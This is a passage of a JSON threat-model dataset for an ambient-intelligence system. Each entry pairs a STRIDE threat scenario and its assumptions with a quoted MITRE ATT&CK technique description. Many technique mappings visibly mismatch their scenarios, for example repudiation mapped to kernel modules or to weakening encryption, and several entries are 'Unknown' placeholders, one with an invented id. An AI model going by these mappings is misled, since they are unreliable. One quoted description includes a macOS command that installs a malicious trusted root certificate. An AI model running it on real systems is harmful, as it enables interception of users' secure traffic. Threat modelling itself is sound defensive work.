                    "Assumption": "No effective monitoring of network traffic for anomalies.",
                    "Role": "Network Security",
                    "Condition": "Lack of intrusion detection or prevention systems."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data compromising user privacy and security.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data exfiltration",
                "weak encryption",
                "network interception",
                "sensor data"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider accesses and leaks sensitive user profiles and system configurations.",
            "Assumptions": [
                {
                    "Assumption": "User profiles and system configurations are stored without proper access controls.",
                    "Role": "Data Storage",
                    "Condition": "Inadequate role-based access control measures."
                },
                {
                    "Assumption": "The insider has sufficient privileges to access sensitive data.",
                    "Role": "Insider Threat",
                    "Condition": "High-level access rights granted to internal personnel."
                },
                {
                    "Assumption": "No effective monitoring or auditing of access to sensitive data.",
                    "Role": "Data Security",
                    "Condition": "Lack of real-time monitoring and audit trails."
                }
            ],
            "Potential Impact": "Sensitive data exposure, leading to privacy breaches and potential misuse of leaked information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "data leakage",
                "user profiles",
                "system configurations"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the communication infrastructure to access unencrypted communications.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not adequately secured.",
                    "Role": "Network Security",
                    "Condition": "Unprotected or weakly protected communication links."
                },
                {
                    "Assumption": "The attacker identifies and exploits a specific vulnerability.",
                    "Role": "Adversary",
                    "Condition": "Knowledge of or access to exploit network vulnerabilities."
                },
                {
                    "Assumption": "No encryption or weak encryption is used for data in transit.",
                    "Role": "Data Security",
                    "Condition": "Use of outdated or weak encryption standards."
                }
            ],
            "Potential Impact": "Interception of communications leading to unauthorized access to sensitive information and potential for further exploits.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network vulnerability",
                "unencrypted communications",
                "data interception",
                "communication infrastructure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--sniff-network-traffic",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the communication infrastructure, disrupting data exchange and system operation.",
            "Assumptions": [
                {
                    "Assumption": "The communication infrastructure lacks effective DDoS protection mechanisms.",
                    "Role": "Network Security",
                    "Condition": "Absence of DDoS mitigation strategies."
                },
                {
                    "Assumption": "The attacker has sufficient resources to generate high-volume traffic.",
                    "Role": "Adversary",
                    "Condition": "Access to botnets or other sources of large-scale traffic generation."
                },
                {
                    "Assumption": "Network capacity is insufficient to handle sudden high loads.",
                    "Role": "System Design",
                    "Condition": "Limited bandwidth or scalability of network infrastructure."
                }
            ],
            "Potential Impact": "Disruption of system operation leading to unavailability of services and potential security risks.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS attack",
                "network disruption",
                "high-volume traffic",
                "communication infrastructure"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the AI/ML processing unit with resource exhaustion, causing system slowdowns or crashes.",
            "Assumptions": [
                {
                    "Assumption": "The AI/ML processing unit is not protected against resource exhaustion attacks.",
                    "Role": "System Design",
                    "Condition": "Absence of resource management and protection mechanisms."
                },
                {
                    "Assumption": "The attacker has the ability to flood the AI/ML unit with excessive computations.",
                    "Role": "Adversary",
                    "Condition": "Knowledge of AI/ML processing endpoints and capabilities."
                },
                {
                    "Assumption": "System lacks monitoring and mitigation for unusual resource usage.",
                    "Role": "Operational Security",
                    "Condition": "Inadequate resource monitoring and management protocols."
                }
            ],
            "Potential Impact": "Reduced system performance and potential crashes affecting overall functionality and user experience.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "AI/ML processing",
                "system slowdown",
                "system crash"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the data repositories with spurious data, overwhelming storage capacity and affecting performance.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories lack effective data validation and capacity management.",
                    "Role": "Data Storage",
                    "Condition": "Insufficient controls over data input and storage capacity."
                },
                {
                    "Assumption": "The attacker can continuously inject large amounts of data into the system.",
                    "Role": "Adversary",
                    "Condition": "Access to data input points and methods of circumvention of any existing controls."
                },
                {
                    "Assumption": "System does not monitor and limit abnormal data input patterns.",
                    "Role": "Operational Security",
                    "Condition": "Lack of real-time data validation and anomaly detection mechanisms."
                }
            ],
            "Potential Impact": "Storage capacity is exhausted, leading to inability to store legitimate data and degraded system performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data repository",
                "spurious data",
                "storage overload",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain administrative privileges and control all system components.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist within the system that allow privilege escalation.",
                    "Role": "System Design",
                    "Condition": "Presence of unpatched or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The attacker gains initial access to the system through weak entry points.",
                    "Role": "Adversary",
                    "Condition": "Compromised credentials or successful exploitation of entry-level vulnerabilities."
                },
                {
                    "Assumption": "Access controls do not sufficiently restrict privilege escalation attempts.",
                    "Role": "Access Management",
                    "Condition": "Weak or no role-based access controls and monitoring."
                }
            ],
            "Potential Impact": "Complete system takeover by the attacker, leading to total compromise of data, functions, and security mechanisms.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative control",
                "system vulnerability",
                "privilege escalation",
                "system takeover"
            ],
            "mitre_technique": {
                "name": "AS-REP Roasting",
                "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                "id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
                "technique_id": "T1558.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider abuses their privileges to gain unauthorized access to restricted data and functionalities.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have broad access rights without sufficient oversight.",
                    "Role": "Access Management",
                    "Condition": "Lack of granular access control and monitoring for internal users."
                },
                {
                    "Assumption": "There are no effective measures to detect and prevent abuse of authorized roles.",
                    "Role": "Operational Security",
                    "Condition": "Absence of insider threat detection mechanisms."
                },
                {
                    "Assumption": "Policies and procedures for access rights management are not enforced.",
                    "Role": "Policy Enforcement",
                    "Condition": "Inadequate implementation and adherence to access policies."
                }
            ],
            "Potential Impact": "Exposure of sensitive data and potential misuse of critical system functionalities, leading to security and operational risks.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "unauthorized access",
                "restricted data",
                "functionality abuse"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised user device to escalate privileges and control actuators within the environment.",
            "Assumptions": [
                {
                    "Assumption": "User devices do not have effective privilege separation and protection.",
                    "Role": "Device Security",
                    "Condition": "User device designs permitting easy privilege escalation."
                },
                {
                    "Assumption": "The attacker can compromise the device via malware or exploitation.",
                    "Role": "Adversary",
                    "Condition": "Delivery of malware or exploitation of device vulnerabilities."
                },
                {
                    "Assumption": "Insufficient monitoring and control of device actions within the network.",
                    "Role": "Network Security",
                    "Condition": "Lack or inadequate device activity monitoring and incident response."
                }
            ],
            "Potential Impact": "Control over actuators can lead to unauthorized physical actions and significant disruptions in the AmI environment.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "user device",
                "malware",
                "actuator control",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a user by stealing their biometric data to gain access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is not securely stored or transmitted.",
                    "Role": "Attacker",
                    "Condition": "Access to intercepted biometric data."
                },
                {
                    "Assumption": "No additional authentication layers beyond biometrics.",
                    "Role": "System Designer",
                    "Condition": "Biometrics used as the sole authentication mechanism."
                },
                {
                    "Assumption": "The attacker has access to devices that store or transmit biometric data.",
                    "Role": "Attacker",
                    "Condition": "Physical access to compromised devices."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of data, security breach.",
            "MITRE ATT&CK Keywords": [
                "biometric spoofing",
                "credential access",
                "data compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake smart card to gain access to restricted areas or data.",
            "Assumptions": [
                {
                    "Assumption": "Smart card encryption can be bypassed.",
                    "Role": "Attacker",
                    "Condition": "Access to decryption tools or techniques."
                },
                {
                    "Assumption": "Lax physical security controls around smart card issuance and usage.",
                    "Role": "System Administrator",
                    "Condition": "Weak physical security measures."
                },
                {
                    "Assumption": "Lack of multi-factor authentication.",
                    "Role": "System Designer",
                    "Condition": "Reliance on smart card only for authentication."
                }
            ],
            "Potential Impact": "Security breach, unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Phishing for Information",
                "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
                "id": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
                "technique_id": "T1598"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts login credentials using a man-in-the-middle (MitM) attack on a user's device to impersonate them.",
            "Assumptions": [
                {
                    "Assumption": "Weak encryption on communication channels.",
                    "Role": "System Designer",
                    "Condition": "Use of outdated or ineffective encryption protocols."
                },
                {
                    "Assumption": "Insecure Wi-Fi networks.",
                    "Role": "User",
                    "Condition": "Use of public or untrusted networks."
                },
                {
                    "Assumption": "Lack of proactive monitoring for MitM attacks.",
                    "Role": "Security Operations",
                    "Condition": "Absence of network monitoring tools."
                }
            ],
            "Potential Impact": "Data compromise, loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "network interception",
                "credential exposure"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware delivered through phishing emails alters data within the system\u2019s data repositories.",
            "Assumptions": [
                {
                    "Assumption": "User clicks on malicious email links.",
                    "Role": "User",
                    "Condition": "Lack of proper security training."
                },
                {
                    "Assumption": "System lacks effective anti-malware defenses.",
                    "Role": "System Administrator",
                    "Condition": "Outdated or misconfigured security software."
                },
                {
                    "Assumption": "No integrity checks on critical data.",
                    "Role": "System Designer",
                    "Condition": "Absence of file integrity monitoring."
                }
            ],
            "Potential Impact": "Data corruption, integrity loss.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "malware",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to the communication infrastructure and modifies the data packets.",
            "Assumptions": [
                {
                    "Assumption": "Weak network security protocols.",
                    "Role": "System Designer",
                    "Condition": "Use of insecure network protocols."
                },
                {
                    "Assumption": "Insufficient monitoring of network anomalies.",
                    "Role": "Security Operations",
                    "Condition": "Lack of robust network intrusion detection systems."
                },
                {
                    "Assumption": "The attacker has tools to spoof or modify network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to sophisticated network manipulation tools."
                }
            ],
            "Potential Impact": "Data corruption, service disruption.",
            "MITRE ATT&CK Keywords": [
                "packet injection",
                "network manipulation",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Unauthorized physical access to a sensor allows an attacker to tamper with the sensor data.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are not physically protected.",
                    "Role": "System Administrator",
                    "Condition": "Lack of physical security controls around sensors."
                },
                {
                    "Assumption": "Data from sensors is not validated.",
                    "Role": "System Designer",
                    "Condition": "Absence of data validation mechanisms."
                },
                {
                    "Assumption": "The attacker has physical access to the environment.",
                    "Role": "Attacker",
                    "Condition": "Lax physical access controls."
                }
            ],
            "Potential Impact": "Data manipulation, integrity compromise.",
            "MITRE ATT&CK Keywords": [
                "physical tampering",
                "sensor manipulation",
                "data falsification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing an action because the system lacks non-repudiation measures.",
            "Assumptions": [
                {
                    "Assumption": "Lack of audit logging for user actions.",
                    "Role": "System Designer",
                    "Condition": "Absence of comprehensive logging mechanisms."
                },
                {
                    "Assumption": "Weak authentication mechanisms.",
                    "Role": "User",
                    "Condition": "Use of easily spoofable authentication methods."
                },
                {
                    "Assumption": "Insufficient logging retention policies.",
                    "Role": "System Administrator",
                    "Condition": "Short log retention periods."
                }
            ],
            "Potential Impact": "Accountability loss, security policy breach.",
            "MITRE ATT&CK Keywords": [
                "action denial",
                "log tampering",
                "non-repudiation failure"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making unauthorized changes to data due to the absence of user activity monitoring.",
            "Assumptions": [
                {
                    "Assumption": "No tracking of individual user actions.",
                    "Role": "System Designer",
                    "Condition": "Absence of detailed user activity logs."
                },
                {
                    "Assumption": "Weak data integrity controls.",
                    "Role": "System Administrator",
                    "Condition": "Lack of mechanisms to ensure data integrity."
                },
                {
                    "Assumption": "Insufficient access controls.",
                    "Role": "System Administrator",
                    "Condition": "Use of broad access permissions."
                }
            ],
            "Potential Impact": "Data integrity loss, operational inefficiency.",
            "MITRE ATT&CK Keywords": [
                "unauthorized changes",
                "user activity monitoring",
                "data integrity compromise"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor interacts with the system using stolen credentials and denies the actions, exploiting lack of traceability.",
            "Assumptions": [
                {
                    "Assumption": "User credential theft is possible.",
                    "Role": "User",
                    "Condition": "Weak or reused passwords."
                },
                {
                    "Assumption": "System lacks detailed access logs.",
                    "Role": "System Designer",
                    "Condition": "Insufficient logging mechanisms."
                },
                {
                    "Assumption": "No binding of actions to specific logs.",
                    "Role": "System Administrator",
                    "Condition": "Logs not associated with unique user actions."
                }
            ],
            "Potential Impact": "Loss of data accountability, unauthorized data access.",
            "MITRE ATT&CK Keywords": [
